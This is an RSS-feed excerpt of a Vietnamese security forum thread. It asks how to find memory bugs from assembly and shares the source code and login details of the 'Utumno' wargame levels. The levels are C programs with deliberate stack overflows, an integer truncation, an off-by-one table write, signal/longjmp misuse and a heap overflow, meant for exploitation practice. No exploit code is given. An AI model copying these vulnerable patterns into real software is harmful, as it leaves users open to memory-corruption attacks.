   Câu hỏi của em trong ý này là: Nhìn vào những lệnh Assembly đó có thể suy ra được lỗi bộ nhớ(cấp phát sai...) làm chương trình bị sụp đổ không?, nếu được thì bằng cách nào, em có thể tham khảo tài liệu nào về vấn đề này.

  PS: dòng màu đỏ chỉ là ví dụ minh họa cho 1 trường hợp nào đó.
        Xin chờ mọi người chỉ bảo, em rất muốn học
        À còn nữa , cái bảng chọn Break Continue Ignore nó có ý gì?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#181992</guid>
				<link>/hvaonline/posts/list/27801.html#181992</link>
				<pubDate><![CDATA[Tue, 26 May 2009 17:11:03]]> GMT</pubDate>
				<author><![CDATA[ the_mistake]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @the_mistake: Mình không biết nhiều về lập trình, nhưng cũng xin trả lời qua vấn đề của bạn. Khi chương trình của bạn gặp lỗi tại runtime, thì bạn nên tiến hành debug code của mình, tức là nếu bạn viết bằng C thì debug trên C, viết bằng assembly thì debug trên assembly. Như vậy, nếu bạn viết trên C++ thì không nên debug sử dụng assembly, như thế sẽ vô cùng khó khăn do đó không phải là cái bạn viết ra. 

Hầu hết các lỗi sai đều có thể được phát hiện bằng việc debug high-level code như C, C++, etc. Tất nhiên là có những lỗi hoặc program behaviours mà để hiểu được rõ ràng thì chỉ có cách debug assembly code, ví dụ như một số lỗi về buffer overflow chẳng hạn.

Trust that helps.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#182344</guid>
				<link>/hvaonline/posts/list/27801.html#182344</link>
				<pubDate><![CDATA[Sat, 30 May 2009 04:48:58]]> GMT</pubDate>
				<author><![CDATA[ StarGhost]]></author>
			</item>
			<item>
				<title>giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[  Thấy chủ đề này hay mà bị chìm khá lâu, mình xin phép post source code của các level trong wargame utumno của đám intruded.net, các puzzle này mô tả được khá nhiều loại lỗi trong C program như tràn bộ đệm, tràn số interger, sử dụng signal không chính xác, tràn 4bytes và tràn heap, thêm 1 điểm nữa là môi trường attack của game utumno này là NX-Enable do đó các bạn không thể đơn giản là return vào shellcode dược( ở đây phải sử dụng giải pháp là ret2libc với địa chỉ libc không có ascii-armor và không có aslr). Các bạn có thể thử sức theo info bên dưới, và pass của level1 là utumno.
Đây là cấu hình của nó:
(~/Intruded/Utumno) dump3r $ ssh level1@utumno.intruded.net -p 10106
*************************************************
*    Welcome to Intruded.net Wargame Server     *
*                                               *
*       * You are playing "Utumno"              *
*       * Most levels can be found in /wargame  *
*       * Login: level1:utumno 		       	*
*	* Support: irc.intruded.net #wargames	*
*						*
*						*
*       ! Server is restarted every 12 hours    *
*       ! Server is cleaned every reboot	*
*       ! /tmp direcotry is writable            *
*                                               *
*						*
*************************************************

level1@utumno.intruded.net's password: 
level1@utumno:~$ cd /wargame/
level1@utumno:/wargame$ ls -la
total 104
drwxr-xr-x  2 root    root   4096 2008-04-18 10:04 .
drwxr-xr-x 22 root    root   4096 2008-04-17 01:41 ..
-rwx--x---  1 level2  level1 7018 2008-04-18 04:52 level1
-r-Sr-x---  1 level3  level2 7437 2008-04-18 04:53 level2
-r-Sr-x---  1 level4  level3 7220 2008-04-18 04:53 level3
-r--r-----  1 level4  level3  961 2008-04-18 10:04 level3.c
-r-Sr-x---  1 level5  level4 7075 2008-04-18 04:53 level4
-r-Sr-x---  1 level6  level5 7258 2008-04-18 04:54 level5
-r--r-----  1 level6  level5 1048 2008-04-18 10:04 level5.c
-r-Sr-x---  1 level7  level6 7510 2008-04-18 04:55 level6
-r--r-----  1 level7  level6 1268 2008-04-18 10:04 level6.c
-r-Sr-x---  1 level8  level7 7721 2008-04-18 04:55 level7
-r--r-----  1 level8  level7 1560 2008-04-18 10:04 level7.c
-r-Sr-x---  1 level9  level8 7635 2008-04-18 04:56 level8
-r--r-----  1 level9  level8 1227 2008-04-18 10:04 level8.c
-rwsr-x---  1 level10 level9 7550 2008-04-20 11:46 level9
-r--r-----  1 level10 level9 1082 2008-04-18 10:04 level9.c
level1@utumno:/wargame$ 

Level1: như các bạn thấy là 1 file chỉ có quyền thức thi.

level2 binary :<span class="link"> http://www.mediafire.com/?xbnjmtdt2mn</span>
level3.c:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdio.h&gt;

int main&#40;int argc, char *argv&#91;&#93;&#41;
{
        char buffer&#91;12&#93;;

        if&#40;argc&#41;
        {
                printf&#40;"Aw..\n"&#41;;
                exit&#40;1&#41;;
        }

        strcpy&#40;buffer, argv&#91;10&#93;&#41;;

        return 0;
}</pre>
		</div>


level4 :<span class="link"> http://www.mediafire.com/?gymkennq3yz</span>

level5.c
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main&#40;int argc, char *argv&#91;&#93;&#41;
{
        char c&#91;65212&#93;;
        char b&#91;64&#93;;
        unsigned short j;
        int i;

        i = atoi&#40;argv&#91;1&#93;&#41;;
        j = i;

        if&#40;j &gt;= 64&#41;
        {
                exit&#40;1&#41;;
        }

        memcpy&#40;b, argv&#91;2&#93;, i&#41;;

        return 0;
}</pre>
		</div>


level6.c
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdio.h&gt;

void hihi&#40;char *p&#41;
{
        char buf&#91;12&#93;;

        if&#40;strlen&#40;p&#41; &gt;= 20&#41; /* 16&#41; */
        {
                strncpy&#40;buf, p, 20&#41;; /* 16&#41;; */
        }
        else
        {
                strcpy&#40;buf, p&#41;;
        }
}

int main&#40;int argc, char *argv&#91;&#93;&#41;
{
        if&#40;argc&#41;
        {
        printf&#40;&quot;Aw..\n&quot;&#41;;
                exit&#40;1&#41;;
        }

        printf&#40;&quot;Here we go - %s\n&quot;, argv&#91;10&#93;&#41;;

        hihi&#40;argv&#91;10&#93;&#41;;

        return 0;
}</pre>
		</div>


level7.c
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main&#40;int argc, char *argv&#91;&#93;&#41;
{
        int table&#91;10&#93;;
        char *p;

        int val, pos;


        if&#40;argc &lt; 3&#41;
        {
                printf&#40;&quot;Missing args\n&quot;&#41;;
                exit&#40;1&#41;;
        }

        p = malloc&#40;32&#41;;
        if&#40;!p&#41;
        {
                printf&#40;&quot;Sorry, ran out of memory :-&#40;\n&quot;&#41;;
                exit&#40;1&#41;;
        }

        val = strtoul&#40;argv&#91;2&#93;, NULL, 16&#41;;
        pos = strtoul&#40;argv&#91;1&#93;, NULL, 10&#41;;

        if&#40;pos &gt; 10&#41;
        {
                printf&#40;&quot;Illegal position in table, quitting..\n&quot;&#41;;
                exit&#40;1&#41;;
        }
        else
        {
                table&#91;pos&#93; = val;
        }

        strcpy&#40;p, argv&#91;3&#93;&#41;;

        printf&#40;&quot;Table position %d has value %d\nDescription: %s\n&quot;,
                pos, table&#91;pos&#93;, p&#41;;

        return 0;
}</pre>
		</div>


level8.c
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;setjmp.h&gt;
#include &lt;signal.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

void jmp&#40;int i&#41;;
jmp_buf  *jbp;

int main&#40;int argc, char *argv&#91;&#93;&#41;
{
        int i;
        jmp_buf foo;
        char buf&#91;128&#93;;

        if&#40;argc &lt; 2&#41;
                exit&#40;1&#41;;

        signal&#40;SIGUSR1, jmp&#41;;
        signal&#40;SIGUSR2, jmp&#41;;

        i = setjmp&#40;foo&#41;;
        jbp = &foo;

        if&#40;i&#41;
                strcpy&#40;buf, argv&#91;1&#93;&#41;;

        sleep&#40;2&#41;;
        exit&#40;i&#41;;
}

void jmp&#40;int i&#41;
{
        longjmp&#40;*jbp, i&#41;;
}</pre>
		</div>

level9.c:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main&#40;int argc, char *argv&#91;&#93;&#41;
{
        char *p, *p2;

        p = malloc&#40;512&#41;;
        if&#40;!p&#41;
        {
                exit&#40;1&#41;;
        }

        p2 = malloc&#40;4&#41;;
        if&#40;!p2&#41;
        {
                exit&#40;1&#41;;
        }

        strcpy&#40;p, argv&#91;1&#93;&#41;;

        free&#40;p&#41;;
        free&#40;p2&#41;;

        return 0;
}</pre>
		</div>
]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#213233</guid>
				<link>/hvaonline/posts/list/27801.html#213233</link>
				<pubDate><![CDATA[Sun, 13 Jun 2010 11:26:00]]> GMT</pubDate>
				<author><![CDATA[ H3x4]]></author>
			</item>
			<item>
				<title>giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[  Có ai chơi trò này ko ta :|, bên mình một số bạn đang đua nhau http://blackbox.smashthestack.org:85/
ai có hứng thú thì join irc chơi chung :)]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#217632</guid>
				<link>/hvaonline/posts/list/27801.html#217632</link>
				<pubDate><![CDATA[Wed, 4 Aug 2010 07:06:22]]> GMT</pubDate>
				<author><![CDATA[ H3x4]]></author>
			</item>
	</channel>
</rss>
